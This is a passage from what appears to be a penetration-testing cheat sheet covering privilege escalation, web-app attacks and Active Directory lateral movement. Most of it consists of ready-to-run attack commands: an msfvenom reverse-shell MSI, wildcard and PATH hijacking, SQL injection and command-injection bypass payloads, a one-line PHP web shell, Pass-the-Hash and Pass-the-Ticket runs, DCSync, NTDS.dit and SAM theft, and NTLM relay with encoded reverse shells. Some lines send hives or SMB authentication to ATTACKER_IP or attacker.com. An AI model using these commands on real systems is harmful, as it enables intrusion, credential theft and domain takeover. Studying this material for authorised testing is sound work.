| T1571 | C2 | Non-Standard Ports |
| T1572 | C2 | Protocol Tunneling |
| T1090 | C2 | Proxy Use |

## Troubleshooting Gotchas
- **Lab spawn:** Wait 3-5 minutes for full config
- **GLIBC:** ptunnel-ng and chisel must match target glibc; use older prebuilt versions
- **Chisel:** Uses WebSocket (ws://), shows latency, "tun: SSH connected", try different version if error
- **Meterpreter autoroute:** Shows deprecation notice, use post module instead
- **Proxychains + ICMP:** Windows blocks ICMP → use TCP discovery


---

# Phase 10: Privilege Escalation

## 10.1 Linux Privilege Escalation

### Manual Checks
```bash
# Sudo rights
sudo -l

# SUID binaries
find / -perm -4000 2>/dev/null
# Cross-reference with GTFOBins: https://gtfobins.github.io/

# Capabilities
getcap -r / 2>/dev/null

# Running processes (look for root-owned services)
ps -aux | grep root

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /var/spool/cron/crontabs/

# Sensitive files
cat /etc/shadow          # if readable
cat ~/.bash_history
cat ~/.ssh/id_rsa

# Kernel version (search for exploits)
uname -a
cat /etc/os-release

# Installed software
dpkg -l
```

### Automated Enumeration
```bash
# LinPEAS (most comprehensive)
./linpeas.sh

# LinEnum
./LinEnum.sh

# linuxprivchecker
python linuxprivchecker.py
```

### Common Linux PrivEsc Vectors
| Vector | Check |
|--------|-------|
| Sudo NOPASSWD | `sudo -l` |
| SUID binaries | `find / -perm -4000` → GTFOBins |
| Writable cron jobs | `/etc/crontab`, `/etc/cron.d/` |
| Capabilities | `getcap -r /` |
| Writable /etc/passwd or /etc/shadow | `ls -la /etc/` |
| Docker socket access | `/var/run/docker.sock` |
| NFS root squashing bypass | Upload SUID binary to NFS share |
| SSH key injection | Write to `~/.ssh/authorized_keys` |

## 10.2 Windows Privilege Escalation

### Manual Checks
```cmd
# User privileges (look for SeImpersonatePrivilege, SeDebugPrivilege)
whoami /priv

# Group memberships
whoami /groups

# System info
systeminfo

# Patches & hotfixes
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\"

# Registry password search
reg query HKLM /f password /t REG_SZ /s

# Running processes
tasklist /svc

# Scheduled tasks
schtasks /query /fo LIST /v
```

### Automated Enumeration
```cmd
# winPEAS
winPEASx64.exe

# Seatbelt (stealthier)
Seatbelt.exe

# JAWS
JAWS-enum.ps1
```

### Common Windows PrivEsc Vectors
| Vector | Check |
|--------|-------|
| SeImpersonatePrivilege | `whoami /priv` → Potato exploits (JuicyPotato, PrintSpoofer) |
| Unquoted service paths | `wmic service get pathname` |
| Always Install Elevated | Registry check: `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer` |
| Stored credentials | `cmdkey /list`, registry, DPAPI |
| DLL hijacking | Check writable directories in %PATH% |
| Scheduled tasks with writable binaries | `schtasks /query` |
| Service misconfigurations | `accesschk.exe` on service binaries |
| LSASS memory dump | Task Manager → Create dump file → pypykatz |
| LAPS passwords | If you have Extended Rights |

### LSASS Dump → Credential Extraction
```
# Via RDP session:
1. Open Task Manager → Processes tab
2. Right-click "Local Security Authority Process" → Create dump file
3. File saved at %temp%\lsass.DMP
4. Transfer to attack host
5. Extract with pypykatz:
   pypykatz lsa minidump lsass.DMP
```


---

## SUPPLEMENTARY: PrivEsc & Web Apps — Advanced Reference

# ADDENDUM 06: Privilege Escalation & Web Apps — Advanced

## Linux PrivEsc — Capabilities
```bash
getcap -r / 2>/dev/null
# Common abuses:
# cap_setuid+ep on python → python -c 'import os; os.setuid(0); os.system("/bin/bash")'
# cap_dac_read_search+ep → read any file
# cap_net_raw+ep → packet capture
```

## Linux PrivEsc — Wildcard Injection
```bash
# If crontab runs: tar cf /backup/archive.tar /home/*
# Create malicious files:
touch /home/--checkpoint=1
touch /home/--checkpoint-action=exec=shell.sh
# When tar runs, it executes shell.sh as root
```

## Linux PrivEsc — PATH Hijacking
```bash
# If script calls command without full path:
echo '/bin/bash' > /tmp/command
chmod +x /tmp/command
export PATH=/tmp:$PATH
# When script runs 'command', it executes your bash
```

## Linux PrivEsc — NFS Root Squashing
```bash
showmount -e TARGET
# If no_root_squash:
mount -t nfs TARGET:/share /mnt
# Create SUID binary on share, execute on target as root
```

## Linux PrivEsc — Automated Tools
```bash
./linpeas.sh -a              # All checks
./lse.sh -l 2                # Linux Smart Enumeration, level 2
./pspy64                     # Monitor processes without root
```

## Windows PrivEsc — Token Impersonation
```cmd
whoami /priv
# Look for: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege
# → Potato exploits (JuicyPotato, RoguePotato, SweetPotato, PrintSpoofer)
PrintSpoofer.exe -i -c cmd.exe
```

## Windows PrivEsc — AlwaysInstallElevated
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=x.x.x.x LPORT=443 -f msi > evil.msi
msiexec /q /i evil.msi
```

## Windows PrivEsc — SeBackupOperator / SeRestoreOperator
```cmd
# SeBackupOperator: read any file including SAM/SYSTEM
reg save HKLM\SAM C:\Users\Public\SAM
reg save HKLM\SYSTEM C:\Users\Public\SYSTEM

# SeRestoreOperator: write to any file → replace binary → persistence
```

## Windows PrivEsc — Automated Tools
| Tool | Command | Description |
|------|---------|-------------|
| **winPEAS** | `winPEASx64.exe` | Windows Privilege Escalation Awesome Script |
| **PowerUp** | `Invoke-AllChecks` | PowerShell privilege escalation enumeration |
| **SharpUp** | `SharpUp.exe audit` | C# PrivEsc checker |
| **PrivescCheck** | `Invoke-PrivescCheck` | PowerShell PrivEsc enumeration |

## XSS Subtypes
| Type | Description | Example |
|------|-------------|---------|
| **Reflected** | Payload in URL, reflected in response | `<script>alert(1)</script>` in search param |
| **Stored** | Payload saved to DB, served to all users | Malicious comment on blog |
| **DOM-based** | Payload processed client-side in DOM | `document.location` manipulation |
| **CSP Bypass** | Defeating Content Security Policy | Using allowed CDN with JSONP |

## SQLi Subtypes
| Type | Description | Detection |
|------|-------------|-----------|
| **UNION-based** | Extract data via UNION SELECT | `' UNION SELECT NULL,NULL-- -` |
| **Boolean-based** | True/false inference | `' AND 1=1-- -` vs `' AND 1=2-- -` |
| **Time-based** | Response time inference | `'; WAITFOR DELAY '0:0:5'-- -` |
| **Error-based** | Error messages reveal data | `' AND (SELECT 1 FROM dual)-- -` |
| **Out-of-band** | Data via DNS/HTTP | `'; EXEC master..xp_dirtree '\\attacker.com\'-- -` |

## File Upload Bypasses
| Filter | Bypass |
|--------|--------|
| **Extension blacklist** | `.pHp`, `.php5`, `.phtml`, `.PHP`, double ext (`shell.php.jpg`), null byte (`shell.php%00.jpg`) |
| **MIME type check** | Change Content-Type to `image/gif` via Burp |
| **Magic bytes** | Add GIF header: `GIF89a;` before PHP code |
| **Size check** | Minimal shell: `<?=\`$_GET[c]\`?>` |

## Command Injection Bypasses
| Filter | Bypass |
|--------|--------|
| **Space blocked** | `${IFS}`, `%09` (Tab), `{cmd,argument}` |
| **Slash blocked** | `${PATH:0:1}`, `$(echo L2V0Yy9wYXNzd2Q= \| base64 -d)` |
| **Blacklist** | `w'h'o'am'i`, `$(rev<<<'imaohw')`, `$(printf '\167\150\157\141\155\151')` |
| **Pipe blocked** | `;`, `&&`, `\|\|`, `|`, `` `cmd` `` |
| **Length limit** | `>` redirect to build command incrementally |

## Login Brute Forcing
```bash
# Hydra
hydra -l admin -P wordlist.txt http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# ffuf
ffuf -u http://target/login -X POST -d "username=admin&password=FUZZ" -w wordlist.txt -mc 200 -fr "Invalid"

# Burp Intruder: Capture login → Send to Intruder → Snipe mode → Load wordlist → Start
```

## ffuf Advanced Usage
```bash
# Recursive
ffuf -u http://target/FUZZ -w wordlist -recursion -recursion-depth 3

# Auto-tuning
ffuf -u http://target/FUZZ -w wordlist -ac

# Filter by size/words/lines/status
ffuf -u http://target/FUZZ -w wordlist -fs 1234 -fw 56 -fl 10 -fc 403,404

# Rate limiting
ffuf -u http://target/FUZZ -w wordlist -rate 100

# Headers
ffuf -u http://target/FUZZ -w wordlist -H "Authorization: Bearer TOKEN"

# Extensions
ffuf -u http://target/FUZZ -w wordlist -e .php,.txt,.js,.bak

# Match status codes
ffuf -u http://target/FUZZ -w wordlist -mc 200,204,301,302,307
```

## Burp Suite / Web Proxy Usage
| Tool | Purpose |
|------|---------|
| **Intercept** | Toggle on/off, modify requests in transit |
| **Repeater** | Manual request manipulation |
| **Intruder** | Automated attacks (sniper, battering ram, pitchfork, cluster bomb) |
| **Scanner** | Auto vuln detection (Pro only) |
| **Comparer** | Compare responses |
| **Decoder** | Encode/decode data |
| **Collaborator** | OOB interaction detection (Pro only) |
| **Match/Replace** | Modify requests automatically |
| **Extensions** | BApp Store for additional functionality |

## Burp Content-Type Bypass for File Upload
1. Intercept upload POST request
2. Change `Content-Type: application/x-php` → `image/gif`
3. Or change extension in filename parameter
4. Forward request


### Windows Missing KB Enumeration
```bash
# Watson — .NET tool for missing KBs + exploit suggestions
# https://github.com/rasta-mouse/Watson
Watson.exe

# WES-NG — systeminfo-based missing KB + CVE enumeration
# https://github.com/bitsadmin/wesng
systeminfo > systeminfo.txt
python3 wes.py systeminfo.txt
```

---

# Phase 11: Lateral Movement & Domain Dominance

## 11.1 AS-REP Roasting (No-Auth Kerberos Attack)

```bash
impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.hashes
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```

## 11.2 DCSync Attack (Domain Dominance)

When you have Domain Admin or equivalent rights:
```bash
impacket-secretsdump domain/user:pass@$IP
```

## 11.3 Advanced ACL Attacks

```powershell
# Add user to group
Add-DomainGroupMember -Identity 'TargetGroup' -Members 'User' -Credential $Cred

# Fake SPN injection for Kerberoasting
Set-DomainObject -Identity targetuser -SET @{serviceprincipalname='fake/SPN'}
# Then Kerberoast the user
```

## 11.4 AD CS Attacks — Certificate Services Exploitation

> **Active Directory Certificate Services (AD CS)** is one of the most impactful modern attack vectors in AD environments. Misconfigured certificate templates allow attackers to obtain certificates for any account, then use those certificates to obtain Kerberos TGTs — **without ever knowing the account's password.**

### ESC8 — NTLM Relay to AD CS Web Enrollment

**How It Works:**
1. AD CS exposes a web enrollment endpoint at `http://<DC>/CertSrv` (often HTTP, not HTTPS)
2. Attacker relays a machine account's NTLM authentication to this endpoint
3. The endpoint issues a `.pfx` certificate for the machine account
4. Attacker uses the certificate to request a TGT via PKINIT
5. Attacker uses the TGT to perform DCSync and dump all domain hashes

**Step 1 — Coerce Authentication (PrinterBug):**
```bash
# Start ntlmrelayx targeting AD CS web enrollment
impacket-ntlmrelayx -t http://<DC_IP>/CertSrv -smb2support -c 'powershell -enc <BASE64>'

# In another terminal — start Responder to capture/poison (disable SMB to allow relay)
# Edit /etc/responder/Responder.conf: set SMB = Off
sudo responder -I tun0

# Trigger authentication from a domain-joined machine
printerbug.py 'domain/user:pass'@<WORKSTATION_IP> <ATTACKER_IP>
```

**Step 2 — Obtain Certificate (.pfx):**
The relayed authentication to `/CertSrv` results in a `.pfx` certificate being issued for the machine account (e.g., `ACADEMY-EA-DC01$`).

**Step 3 — Request TGT with PKINIT:**
```bash
# Convert .pfx to base64 for use with gettgtpkinit.py
base64 -w 0 certificate.pfx

# Request TGT (saved as .ccache file)
python3 gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 '<BASE64_CERT>' dc01.ccache

# Verify the ticket
export KRB5CCNAME=dc01.ccache
klist
```

**Step 4 — DCSync with the TGT:**
```bash
# Dump all domain hashes using the machine account TGT
impacket-secretsdump -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

# Or dump ALL domain hashes
impacket-secretsdump -just-dc -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

> **Full attack chain:** ESC8 (NTLM relay → certificate) → PKINIT (certificate → TGT) → DCSync (TGT → all domain hashes) → Domain Dominance.

### Shadow Credentials — Abusing msDS-KeyCredentialLink

**How It Works:**
1. Attacker writes an attacker-controlled public key to a victim account's `msDS-KeyCredentialLink` attribute
2. Attacker uses the corresponding private key to request a TGT via PKINIT
3. The victim's password can be changed or the account fully compromised
4. **Persists across password resets** — the key credential is independent of the password

**Using pywhisker:**
```bash
# Add attacker-controlled key to victim's msDS-KeyCredentialLink
python3 pywhisker.py -d "inlanefreight.local" -u "forend" -p "Klmcargo2" --target "mlefay" --action "add" --filename mlefay_shadow

# This generates mlefay_shadow.pfx (the private key + certificate)

# Request TGT with the shadow credential
python3 gettgtpkinit.py INLANEFREIGHT.LOCAL/mlefay -pfx-cert mlefay_shadow.pfx mlefay.ccache
export KRB5CCNAME=mlefay.ccache
klist

# Now authenticate as mlefay — even if their password is changed
python3 gettgtpkinit.py INLANEFREIGHT.LOCAL/mlefay -pfx-cert mlefay_shadow.pfx mlefay_new.ccache
```

> **Key advantage:** Shadow Credentials persist across password resets. Even if the victim changes their password, the attacker can still authenticate using the key credential.

**Removing the shadow credential (cleanup):**
```bash
python3 pywhisker.py -d "inlanefreight.local" -u "forend" -p "Klmcargo2" --target "mlefay" --action "list"
python3 pywhisker.py -d "inlanefreight.local" -u "forend" -p "Klmcargo2" --target "mlefay" --action "remove" --device-id <DEVICE_ID>
```

### PassTheCert — LDAPS Certificate Authentication (No PKINIT Required)

For environments where PKINIT is not supported or blocked:

```bash
# Authenticate over LDAPS using a certificate for AD attacks
python3 passthecert.py -domain inlanefreight.local -dc-ip 172.16.5.5 -crt cert.pem -key cert.key -action modify_user -target victim_user -new-desc "Backdoored Account"

# Can be used for:
# - Modifying user attributes
# - Adding users to groups
# - Resetting passwords
# - Granting DCSync rights
```

---

## 11.5 Pass-the-Hash (PtH) — Comprehensive Techniques

> Pass-the-Hash allows authentication using an NTLM hash **without knowing the plaintext password**. The hash is sufficient because Windows does not salt NTLM hashes.

### Prerequisites
- Administrative (or specific) privileges on the target machine to obtain the hash
- Hash can come from: SAM dump, LSASS extraction, NTDS.dit, network capture, or relay attacks

### PtH with Mimikatz (Windows)
```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:Administrator /rc4:30B3783CE2ABF1AF70F77D0660CF3453 /domain:inlanefreight.htb /run:cmd.exe" exit
```

| Parameter | Description |
|-----------|-------------|
| `/user` | Username to impersonate |
| `/rc4` or `/NTLM` | NTLM hash of the user's password |
| `/domain` | Domain (use `.` or computer name for local accounts) |
| `/run` | Program to launch in the user's context (default: cmd.exe) |

### PtH with Invoke-TheHash (PowerShell — Windows)
```powershell
Import-Module .\Invoke-TheHash.psd1

# SMBExec — execute commands remotely
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

# WMIExec — alternative execution method
Invoke-WMIExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "whoami"
```

### PtH with Impacket (Linux)
```bash
# psexec — uploads executable to ADMIN$, registers service via RPC
impacket-psexec -hashes :30B3783CE2ABF1AF70F77D0660CF3453 administrator@10.10.110.17

# wmiexec — no file drop, fewer logs
impacket-wmiexec -hashes :30B3783CE2ABF1AF70F77D0660CF3453 administrator@10.10.110.17

# smbexec — uses SMB service creation
impacket-smbexec -hashes :30B3783CE2ABF1AF70F77D0660CF3453 administrator@10.10.110.17
```

### PtH with NetExec (Linux)
```bash
# Authenticate and execute commands
netexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE -x 'whoami' --exec-method smbexec

# With evil-winrm
evil-winrm -i 10.10.110.17 -u Administrator -H "2B576ACBE6BCFDA7294D6BD18041B8FE"
```

### PtH with RDP (xfreerdp)
```bash
# First, enable Restricted Admin Mode on the target
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# Then connect using the hash
xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA
```

> **UAC Bypass Note:** The `LocalAccountTokenFilterPolicy` registry key controls which local admin accounts can perform remote admin. If set to `1`, all local admins get full tokens. If `0` or absent, only the built-in Administrator (RID 500) gets a full token.

---

## 11.6 Pass-the-Ticket (PtT) — Windows & Linux

> Pass-the-Ticket uses stolen Kerberos tickets to authenticate as another user **without needing their password or hash**.

### OverPass-the-Hash / Pass-the-Key (Windows)

Convert an NTLM hash into a Kerberos TGT:

```cmd
# Mimikatz — request TGT using NTLM hash (no password needed)
mimikatz.exe privilege::debug "sekurlsa::pth /user:administrator /domain:inlanefreight.local /ntlm:30B3783CE2ABF1AF70F77D0660CF3453 /run:powershell.exe" exit

# Rubeus — request TGT with AES256 (preferred — avoids encryption downgrade detection)
Rubeus.exe asktgt /user:administrator /domain:inlanefreight.local /aes256:<AES256_KEY> /ptt

# Rubeus — request TGT with NTLM hash (may trigger "encryption downgrade" alerts)
Rubeus.exe asktgt /user:administrator /domain:inlanefreight.local /rc4:30B3783CE2ABF1AF70F77D0660CF3453 /ptt
```

### Ticket Harvesting (Windows)
```cmd
# Mimikatz — export all tickets from LSASS
mimikatz.exe privilege::debug "sekurlsa::tickets /export" exit

# Rubeus — dump and export tickets
Rubeus.exe dump /luid:0x12345 /nowrap
Rubeus.exe dump /service:krbtgt /nowrap

# The exported .kirbi files can be injected into the current session
mimikatz.exe "kerberos::ptt administrator.kirbi" exit
Rubeus.exe ptt /ticket:administrator.kirbi
```

### Cross-Platform Ticket Conversion
```bash
# Convert .kirbi (Windows) to .ccache (Linux)
impacket-ticketConverter administrator.kirbi administrator.ccache

# Convert .ccache (Linux) to .kirbi (Windows)
impacket-ticketConverter administrator.ccache administrator.kirbi
```

### Pass-the-Ticket from Linux

**Finding KeyTab Files:**
KeyTab files contain Kerberos principals and encrypted keys — they can be used to authenticate as any principal in the file.
```bash
# Search for keytab files
find / -name *.keytab 2>/dev/null

# Check cronjobs for keytab references
cat /etc/crontab | grep keytab

# Extract hashes from keytab files
git clone https://github.com/zyn3rgy/KeyTabExtract.git
python3 keytabextract.py user.keytab
# Outputs: NTLM hash, AES-256, AES-128 keys

# Authenticate with extracted credentials
kinit -kt user.keytab user@INLANEFREIGHT.LOCAL
klist    # verify the ticket
```

**CCache File Abuse:**
Kerberos credential cache files in `/tmp/` contain active TGTs that can be reused.
```bash
# Find ccache files
find /tmp -name "krb5cc*" -o -name "*.ccache" 2>/dev/null
ls -la /tmp/

# Check which user owns the ccache
ls -la /tmp/krb5cc_*

# Copy and use the ccache
cp /tmp/krb5cc_1000 ./stolen.ccache
export KRB5CCNAME=./stolen.ccache

# Verify the ticket
klist

# Now authenticate as the ticket owner (even if they are a Domain Admin)
python3 secretsdump.py -just-dc -k -no-pass "DC01$"@DC01.INLANEFREIGHT.LOCAL
```

> **Detect AD-joined Linux hosts:** `realm list` or `ps -ef | grep sssd|winbind` — if these return results, the Linux host is joined to the AD domain and may contain Kerberos artifacts.

---

## 11.7 SAM/SYSTEM/SECURITY Hive Extraction

> The SAM (Security Account Manager) database stores local account password hashes. Combined with the SYSTEM hive (which contains the boot key for SAM decryption) and the SECURITY hive (which contains LSA secrets), an attacker can extract all local credentials.

### Extraction (Windows)
```cmd
# Save registry hives to files
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

### Transfer to Attacker
```bash
# Impacket SMB server
sudo impacket-smbserver -smb2support share /tmp/hives

# From Windows target
copy C:\sam.save \\ATTACKER_IP\share\
copy C:\system.save \\ATTACKER_IP\share\
copy C:\security.save \\ATTACKER_IP\share\
```

### Parse Hashes (Linux)
```bash
# Impacket secretsdump
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL

# Output format:
# username:rid:lm_hash:nt_hash:::
```

### Cracking
```bash
# Crack NTLM hashes (mode 1000)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# Crack DCC2 — Domain Cached Credentials v2 (mode 2100)
# DCC2 uses PBKDF2 — CANNOT be used for Pass-the-Hash attacks
hashcat -m 2100 '$DCC2$10240#administrator#hash' /usr/share/wordlists/rockyou.txt
```

> **Critical distinction:** DCC2 hashes (mode 2100) are derived using PBKDF2 and **cannot** be used for Pass-the-Hash. They must be cracked to obtain the plaintext password first.

---

## 11.8 NTDS.dit Extraction — Domain-Wide Credential Dump

> `NTDS.dit` is the primary Active Directory database file stored on Domain Controllers. It contains **all domain usernames, password hashes, and critical schema information**. Compromising this file means potential access to every account in the domain.

### Method 1 — VSS Shadow Copy + Manual Copy (Windows)
```cmd
# Create a volume shadow copy
vssadmin CREATE SHADOW /For=C:

# Copy NTDS.dit from the shadow copy (use GLOBALROOT path)
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit

# Also copy the SYSTEM hive
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM C:\NTDS\SYSTEM

# Transfer both files to attacker via SMB, RDP drive, etc.
```

### Method 2 — NetExec (ntdsutil module) (Linux)
```bash
# One-liner extraction via NetExec
netexec smb <DC_IP> -u <user> -p <pass> -M ntdsutil

# Or use secretsdump directly (requires DA or equivalent rights)
impacket-secretsdump -outputfile domain_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss
```

### Method 3 — DCSync (Linux — no file transfer needed)
```bash
# DCSync — requests password data from the DC via replication protocol
impacket-secretsdump -just-dc-user INLANEFREIGHT/administrator -k -no-pass "DC01$"@DC01.INLANEFREIGHT.LOCAL

# Dump ALL domain hashes
impacket-secretsdump -just-dc INLANEFREIGHT/administrator@172.16.5.5
# Output saved to domain_hashes files
```

### Extracting from NTDS.dit + SYSTEM
```bash
# If you have the raw NTDS.dit and SYSTEM files
impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL -output nt-hash
```

---

## 11.9 NTLM Relay Attack Chains

> NTLM Relay is one of the most powerful attack chains in AD environments. Instead of cracking hashes, you relay them in real-time to authenticate to other machines.

### Core Concept
1. Victim sends NTLM authentication (tricked by Responder poisoning)
2. Instead of cracking the hash, you relay it to another target
3. The target accepts the relayed authentication, granting access

### Step 1 — Disable SMB in Responder
Edit `/etc/responder/Responder.conf`:
```ini
[SMB]
SMB = Off    # CRITICAL — prevents Responder from answering SMB itself
```

### Step 2 — Start ntlmrelayx
```bash
# Basic relay — dump SAM database on target
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

# Execute arbitrary commands on target
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <BASE64_ENCODED_REVERSE_SHELL>'

# Relay to multiple targets
impacket-ntlmrelayx --no-http-server -smb2support -tf targets.txt -c 'whoami > C:\Windows\Temp\pwned.txt'
```

### Step 3 — Trigger Authentication
```bash
# Let Responder do its work (victim mistypes a share name)
sudo responder -I tun0

# OR — force MSSQL authentication to your SMB server
# On the MSSQL server:
EXEC master..xp_dirtree '\\10.10.110.17\share\'
EXEC master..xp_subdirs '\\10.10.110.17\share\'
# This causes the SQL Server service account to authenticate to your SMB server
```

### MSSQL xp_dirtree Hash Stealing (Standalone)
```bash
# Start impacket-smbserver (alternative to Responder)
sudo impacket-smbserver share ./ -smb2support

# On the MSSQL server:
EXEC master..xp_dirtree '\\ATTACKER_IP\share\'
# Captures the SQL Server service account NTLMv2 hash
```

---

## 11.10 Post-Compromise Systematic Checks (Critical Patterns)

After gaining access to **any** host, perform these checks systematically:

### 1. Always Check for Additional NICs
```bash
# Linux
ifconfig
ip addr show

# Windows
ipconfig /all
```
> Every additional network interface = a potentially unreachable network segment. This is the **primary method** for discovering pivot opportunities.

### 2. Always Check Home Directories for Credentials
```bash
# Linux — check web server user home directories
ls -la /home/webadmin/.ssh/
cat /home/webadmin/.bash_history
cat /home/mlefay/.ssh/id_rsa

# Check for credentials left by previous pentesters
cat /var/www/html/*.php | grep -i pass
cat /var/www/html/*.xml
```

### 3. Always Check for Mapped Network Drives (Windows)
```cmd
net use
dir Z:\    # mapped drives may lead directly to DC resources
```
> In lab scenarios, mapped drives (e.g., `Z:\AutomateDCAdmin`) have provided direct access to Domain Controller resources **without** needing to compromise the DC itself.

### 4. Always Check for Web Shells (Persistence/Re-Entry)
> If a previous pentester left a web shell, use it as initial foothold. Common locations:
> - `/var/www/html/` (PHP shells)
> - `C:\inetpub\wwwroot\` (ASPX shells)
> - Check source code comments, hidden directories, and `robots.txt`

### 5. Password Pattern Reuse in Service Accounts
> Organizations often reuse password patterns across services. If you find `mlefay:Plain Human work!`, try similar patterns for other service accounts. This is especially effective against poorly managed service account credentials.


---

## SUPPLEMENTARY: AD Attacks & Credential Hunting — Advanced Reference

# ADDENDUM 05: AD Attacks, Password Attacks & Credential Hunting

## Pass-the-Hash (PtH) Complete

### Windows — Mimikatz
```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:<HASH> /run:"cmd.exe"
```

### evil-WinRM PtH
```bash
evil-winrm -i 10.129.x.x -u Administrator -H <NTLM_HASH>
```

### xfreerdp PtH (Restricted Admin Mode)
```bash
xfreerdp /v:TARGET /u:Administrator /pth:<HASH>
# Enable Restricted Admin Mode if needed:
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

### CrackMapExec PtH
```bash
crackmapexec smb 10.129.x.x -u Administrator -H <HASH> --local-auth
```

### Impacket PtH
```bash
impacket-psexec -hashes :<HASH> Administrator@IP
impacket-wmiexec -hashes :<HASH> Administrator@IP
impacket-smbexec -hashes :<HASH> Administrator@IP
```

### Invoke-TheHash
```powershell
Invoke-SMBExec -Target IP -Username Admin -Hash <HASH> -Command "whoami"
```

### UAC Bypass — LocalAccountTokenFilterPolicy
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy
# Value 0 (default): Local accounts get filtered token — PtH FAILS
# Value 1: Full token — PtH WORKS
```

### DCC2 Warning
DCC2 hashes (hashcat mode 2100) **CANNOT be used for PtH** — must crack first.

## Pass-the-Ticket (PtT) — Windows & Linux

### Windows — Ticket Harvesting (Mimikatz)
```cmd
mimikatz # sekurlsa::tickets /export    # Export all tickets
mimikatz # kerberos::ptt ticket.kirbi   # Inject ticket
```

### Windows — Rubeus
```cmd
Rubeus.exe triage                      # List tickets
Rubeus.exe dump                        # Dump all tickets
Rubeus.exe ptt /ticket:ticket.kirbi   # Inject ticket
```

### OverPass-the-Hash (Windows)
Convert NTLM/AES hash to TGT without password:
```cmd
mimikatz # sekurlsa::logonpasswords     # Get NTLM or AES hash
mimikatz # sekurlsa::pth /user:admin /domain:DOM /ntlm:<HASH> /run:"klist"
# Or with AES keys:
mimikatz # sekurlsa::ekeys              # Get AES keys
```

### Linux — ccache File Abuse
```bash
find / -name "*.ccache" -o -name "krb5cc_*" 2>/dev/null
echo $KRB5CCNAME
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec -k -no-pass domain/user@target
impacket-smbexec -k -no-pass domain/user@target
```

### Linux — KeyTab Extraction
```bash
find / -name "*.keytab" 2>/dev/null
klist -k -t -K -e /path/to/keytab
kinit -kt /path/to/keytab principal@DOMAIN
```

### Cross-Platform Ticket Conversion
```bash
impacket-ticketConverter ticket.kirbi ticket.ccache   # Windows → Linux
impacket-ticketConverter ticket.ccache ticket.kirbi   # Linux → Windows
```

### Kerberoasting
```bash
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP -request
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

### AS-REP Roasting
```bash
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -format hashcat -outputfile hashes.txt
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

## SAM/SYSTEM/SECURITY Hive Extraction
```cmd
reg save HKLM\SAM C:\Users\Public\SAM
reg save HKLM\SYSTEM C:\Users\Public\SYSTEM
reg save HKLM\SECURITY C:\Users\Public\SECURITY

# Extract hashes
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

# Crack DCC2
hashcat -m 2100 dcc2_hashes.txt /usr/share/wordlists/rockyou.txt
```

## NTDS.dit Extraction
```bash
# VSS shadow copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
reg save HKLM\SYSTEM C:\SYSTEM

# ntdsutil
ntdsutil "ac i ntds" "ifm" "create full C:\extract" q q

# secretsdump (preferred — no file transfer needed)
impacket-secretsdump -just-dc -just-dc-user Admin DOMAIN/USER:PASS@DC_IP
impacket-secretsdump -just-dc -ntds ntds.dit -system SYSTEM LOCAL
```

## NTLM Relay Attack Chains

### Responder Configuration
```bash
# Edit /etc/Responder/Responder.conf → SMB=Off, HTTP=Off
responder -I tun0
```

### impacket-ntlmrelayx
```bash
# Basic relay
impacket-ntlmrelayx -tf targets.txt -smb2support

# With command execution
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"

# Relay to LDAP (AD CS ESC8)
